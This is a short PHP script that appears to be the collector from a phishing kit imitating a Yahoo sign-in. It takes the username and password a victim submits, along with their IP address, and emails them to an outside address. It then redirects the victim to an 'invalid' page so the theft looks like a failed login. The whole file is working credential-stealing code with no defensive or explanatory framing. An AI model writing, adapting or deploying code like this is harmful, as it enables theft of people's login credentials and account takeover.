<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['username'];
$password = $_POST['passwd'];


$login = "E : ".$email;
$pass = "Prob : ".$password;
$target = "IP : ".$ip;


$head = "########### L0g1n info ############";
$foot = "####### snOOpy lOdGe ###########";
$body = "Yahoo 1";
mail("me@emailpostmaster.xyz", "$body","$head \n$login \n$pass \n$target \n$foot");
header("Location: invalid.php?email=$email");
?>

